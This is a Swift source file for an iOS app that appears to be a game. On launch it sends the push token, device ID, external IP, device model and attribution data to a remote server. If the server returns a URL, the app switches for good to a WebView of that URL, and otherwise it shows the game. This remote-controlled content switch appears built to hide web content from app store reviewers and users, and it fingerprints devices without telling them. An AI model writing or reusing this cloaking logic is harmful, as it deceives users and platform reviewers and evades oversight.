import Foundation
import SwiftUI
import OneSignalFramework
import AppsFlyerLib

public enum AppScreenState {
    case loading
    case webView
    case game
}

public struct AppState: Codable {
    var isWebPartOpened: Bool
    var isGamePartOpened: Bool
    var wasIDFARequested: Bool
    var isDataReceived: Bool
    var isReceivedErrorData: Bool
    var initialPath: String
    var secondaryPath: String
    var conversionDataString: String?
    var idfaPermissionResponded: Bool
    var isTrackingResponded: Bool
    var isErrorOccurred: Bool
    var isDataFetched: Bool
    var primaryRoute: String
    
    static var `default`: AppState {
        AppState(
            isWebPartOpened: false,
            isGamePartOpened: false,
            wasIDFARequested: false,
            isDataReceived: false,
            isReceivedErrorData: false,
            initialPath: "",
            secondaryPath: "",
            conversionDataString: nil,
            idfaPermissionResponded: false,
            isTrackingResponded: false,
            isErrorOccurred: false,
            isDataFetched: false,
            primaryRoute: ""
        )
    }
}

public class AppParameters: ObservableObject {
    public static let shared = AppParameters()
    private let defaults = UserDefaults.standard
    private var tokenWaitTimer: Timer?
    private var waitAttempts = 0
    private let maxWaitAttempts = 10
    private var currentCompletion: ((Int) -> Void)?
    @Published private(set) var state = AppState.default
    @Published public var shouldShowGame: Bool = false
    @Published public var currentScreen: AppScreenState = .loading
    @Published public var webViewURL: String?
    
    private init() {
        loadValues()
    }
    
    public func loadValues() {
        if let savedUrl = defaults.string(forKey: AppConfig.Keys.targetUrl),
           !savedUrl.isEmpty {
            webViewURL = savedUrl
            currentScreen = .webView
        } else if defaults.bool(forKey: AppConfig.Keys.forceGame) {
            currentScreen = .game
        }
    }
    
    public func updateState(_ update: @escaping (inout AppState) -> Void) {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            update(&self.state)
            self.objectWillChange.send()
        }
    }
    
    public func saveConversionData(_ data: [String: Any]) {
        print("📊 Saving conversion data: \(data)")
        if let jsonData = try? JSONSerialization.data(withJSONObject: data),
           let jsonString = String(data: jsonData, encoding: .utf8) {
            state.conversionDataString = jsonString
            defaults.set(jsonString, forKey: "conversion_data")
            print("✅ Successfully saved conversion data")
        }
    }
    
    public func getConversionData() -> [String: Any]? {
        guard let jsonString = state.conversionDataString,
              let jsonData = jsonString.data(using: .utf8),
              let conversionData = try? JSONSerialization.jsonObject(with: jsonData) as? [String: Any] else {
            print("⚠️ No conversion data available")
            return nil
        }
        print("📊 Retrieved conversion data: \(conversionData)")
        return conversionData
    }
    
    public func initializeRouting() {
        print("🚀 Initializing routing process")
        createInitialLink()
    }
    
    public func createInitialLink() {
        print("🔗 Starting createInitialLink process")
        if state.isDataReceived {
            print("✅ Data is already received, proceeding to processLink")
            processLink()
        } else {
            print("⏳ Data not received yet, starting timer")
            var attempts = 0
            let timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] timer in
                guard let self = self else {
                    timer.invalidate()
                    return
                }
                
                attempts += 1
                print("🔄 Attempt \(attempts) to check data")
                
                if self.state.isDataReceived {
                    print("✅ Data received after \(attempts) attempts")
                    timer.invalidate()
                    self.processLink()
                    return
                }
                
                if attempts >= 10 {
                    print("⚠️ Max attempts reached, proceeding anyway")
                    timer.invalidate()
                    self.processLink()
                }
            }
            timer.fire()
        }
    }
    
    public func processLink() {
        if defaults.bool(forKey: AppConfig.Keys.forceGame) {
            print("🎮 Force game mode is active, skipping server requests")
            defaults.set(true, forKey: AppConfig.Keys.checksComplete)
            transitionToGame()
            return
        }
        
        if let savedUrl = defaults.string(forKey: AppConfig.Keys.targetUrl),
           !savedUrl.isEmpty {
            print("🌐 Using saved URL: \(savedUrl)")
            defaults.set(true, forKey: AppConfig.Keys.checksComplete)
            transitionToWebView(url: savedUrl)
            return
        }
        
        print("🔗 Starting processLink")
        if let token = OneSignal.User.pushSubscription.token, !token.isEmpty {
            print("✅ Found OneSignal token: \(token)")
            defaults.set(token, forKey: AppConfig.Keys.cachedToken)
            checkRedirectURL()
            return
        }
        
        print("⏳ No OneSignal token yet, starting token wait timer")
        waitAttempts = 0
        tokenWaitTimer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(checkTokenStatus), userInfo: nil, repeats: true)
    }
    
    @objc private func checkTokenStatus() {
        waitAttempts += 1
        print("🔄 Token check attempt \(waitAttempts)")
        
        if let token = OneSignal.User.pushSubscription.token, !token.isEmpty {
            print("✅ Token received after \(waitAttempts) attempts: \(token)")
            defaults.set(token, forKey: AppConfig.Keys.cachedToken)
            tokenWaitTimer?.invalidate()
            tokenWaitTimer = nil
            checkRedirectURL()
            return
        }
        
        if waitAttempts >= maxWaitAttempts {
            print("⚠️ Max token wait attempts reached, proceeding without token")
            tokenWaitTimer?.invalidate()
            tokenWaitTimer = nil
            checkRedirectURL()
        }
    }
    
    private func checkRedirectURL() {
        if defaults.bool(forKey: AppConfig.Keys.linkProcessed) {
            print("⚠️ URL check was already processed, skipping")
            tokenWaitTimer?.invalidate()
            tokenWaitTimer = nil
            return
        }
        
        print("🌐 Starting checkRedirectURL")
        let trackingURL = createTrackingURL()
        print("🔗 Created tracking URL: \(trackingURL)")
        
        guard let url = URL(string: trackingURL) else {
            print("❌ Invalid tracking URL")
            handleError()
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 12
        
        let session = URLSession(configuration: .default)
        let task = session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            self.tokenWaitTimer?.invalidate()
            self.tokenWaitTimer = nil
            
            if let error = error {
                print("❌ Network error: \(error)")
                self.handleError()
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                print("❌ Invalid response type")
                self.handleError()
                return
            }
            
            print("📡 Server response status: \(httpResponse.statusCode)")
            
            guard (200...299).contains(httpResponse.statusCode),
                  let data = data else {
                print("❌ Invalid status code or no data")
                self.handleError()
                return
            }
            
            if let jsonString = String(data: data, encoding: .utf8) {
                print("📥 Raw server response: \(jsonString)")
            }
            
            // Проверяем на пустой JSON
            if let jsonObject = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               jsonObject.isEmpty {
                print("📦 Empty JSON received - showing game")
                self.showGame()
                return
            }
            
            // Пробуем декодировать JSON
            do {
                let response = try JSONDecoder().decode(ServerResponse.self, from: data)
                print("✅ Server response decoded: \(response)")
                
                if response.url.count > 3 {
                    print("🌐 Received valid URL from server: \(response.url)")
                    
                    DispatchQueue.main.async {
                        self.defaults.set(true, forKey: AppConfig.Keys.linkProcessed)
                        self.defaults.set(response.url, forKey: AppConfig.Keys.targetUrl)
                        self.defaults.set(true, forKey: AppConfig.Keys.webViewShown)
                        self.defaults.set(1, forKey: AppConfig.Keys.appStatus)
                        self.defaults.set(true, forKey: AppConfig.Keys.checksComplete)
                        
                        self.updateState { state in
                            state.initialPath = response.url
                            state.secondaryPath = response.url
                            state.isWebPartOpened = true
                        }
                        
                        if !self.defaults.bool(forKey: AppConfig.Keys.webKey) {
                            print("📊 Logging WebView event to AppsFlyer")
                            self.defaults.set(true, forKey: AppConfig.Keys.webKey)
                        }
                        
                        print("🎯 Transitioning to WebView with URL: \(response.url)")
                        self.transitionToWebView(url: response.url)
                        
                        if let completion = self.currentCompletion {
                            completion(1)
                        }
                    }
                } else {
                    print("❌ URL too short")
                    self.showGame()
                }
            } catch {
                print("❌ JSON decoding error: \(error)")
                if let jsonObject = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                    print("🔍 Manual JSON parsing result: \(jsonObject)")
                }
                self.showGame()
            }
        }
        task.resume()
    }
    
    private func showGame() {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            
            self.updateState { state in
                state.isGamePartOpened = true
            }
            
            self.defaults.set(true, forKey: AppConfig.Keys.forceGame)
            self.defaults.set(true, forKey: AppConfig.Keys.checksComplete)
            self.defaults.set(2, forKey: AppConfig.Keys.appStatus)
            self.defaults.set(true, forKey: AppConfig.Keys.apiFailed)
            
            if !self.defaults.bool(forKey: AppConfig.Keys.gameKey) {
                print("📊 Logging GameView event to AppsFlyer")
                AppsFlyerLib.shared().logEvent("GameView", withValues: nil)
                self.defaults.set(true, forKey: AppConfig.Keys.gameKey)
            }
            
            print("🎮 Force transitioning to game")
            self.shouldShowGame = true
            self.transitionToGame()
            
            if let completion = self.currentCompletion {
                completion(2)
            }
        }
    }
    
    private func handleError() {
        showGame()
    }
    
    private func createTrackingURL() -> String {
        let semaphore = DispatchSemaphore(value: 0)
        var resultURL = ""
        
        DispatchQueue.global(qos: .userInitiated).async {
            var components = URLComponents(string: AppConfig.baseUrl)
            
            var fcmToken = OneSignal.User.pushSubscription.token ?? ""
            if fcmToken.isEmpty {
                fcmToken = self.defaults.string(forKey: AppConfig.Keys.cachedToken) ?? ""
            }
            
            let deviceId = self.defaults.string(forKey: AppConfig.Keys.deviceId) ?? UUID().uuidString
            let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
            
            var afattr: String?
            var afattr_bs64: String?
            
            if let conversionData = self.getConversionData(),
               let jsonData = try? JSONSerialization.data(withJSONObject: conversionData),
               let jsonString = String(data: jsonData, encoding: .utf8) {
                afattr = jsonString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)
                afattr_bs64 = jsonData.base64EncodedString()
            }
            
            var queryItems = [
                URLQueryItem(name: "fcmtoken", value: fcmToken),
                URLQueryItem(name: "osextid", value: deviceId),
                URLQueryItem(name: "bundle_id", value: Bundle.main.bundleIdentifier ?? ""),
                URLQueryItem(name: "apple_id", value: AppConfig.appleAppId),
                URLQueryItem(name: "lng", value: Locale.current.language.languageCode?.identifier ?? "en"),
                URLQueryItem(name: "firsttime", value: String(Int(Date().timeIntervalSince1970))),
                URLQueryItem(name: "iuid", value: deviceId),
                URLQueryItem(name: "device_model", value: UIDevice.current.model),
                URLQueryItem(name: "os_ver", value: UIDevice.current.systemVersion),
                URLQueryItem(name: "fip4", value: self.getExternalIP()),
                URLQueryItem(name: "afid", value: appsFlyerUID)
            ]
            
            if let afattr = afattr {
                queryItems.append(URLQueryItem(name: "afattr", value: afattr))
            } else if let afattr_bs64 = afattr_bs64 {
                queryItems.append(URLQueryItem(name: "afattr_bs64", value: afattr_bs64))
            }
            
            components?.queryItems = queryItems
            resultURL = components?.url?.absoluteString ?? ""
            print("🔗 FINAL LINK: \(resultURL)")
            
            semaphore.signal()
        }
        
        _ = semaphore.wait(timeout: .now() + 5)
        return resultURL
    }
    
    private func getExternalIP() -> String {
        let semaphore = DispatchSemaphore(value: 0)
        var result = ""
        
        let session = URLSession(configuration: .ephemeral)
        guard let url = URL(string: "https://api.ipify.org") else { return "" }
        
        let task = session.dataTask(with: url) { data, _, _ in
            defer { semaphore.signal() }
            if let data = data, let ip = String(data: data, encoding: .utf8) {
                result = ip
            }
        }
        task.resume()
        
        _ = semaphore.wait(timeout: .now() + 3.0)
        return result
    }
    
    public func transitionToWebView(url: String) {
        DispatchQueue.main.async {
            print("🔄 AppParameters - Transitioning to WebView with URL: \(url)")
            self.webViewURL = url
            self.currentScreen = .webView
            self.defaults.set(true, forKey: AppConfig.Keys.checksComplete)
        }
    }
    
    public func transitionToGame() {
        DispatchQueue.main.async {
            print("🎮 AppParameters - Transitioning to game")
            self.currentScreen = .game
            self.defaults.set(false, forKey: AppConfig.Keys.webViewShown)
            self.defaults.set("", forKey: AppConfig.Keys.targetUrl)
            self.defaults.set(2, forKey: AppConfig.Keys.appStatus)
            self.defaults.set(true, forKey: AppConfig.Keys.checksComplete)
        }
    }
}

struct ServerResponse: Codable {
    let url: String
    let saveFirst: Bool
} 
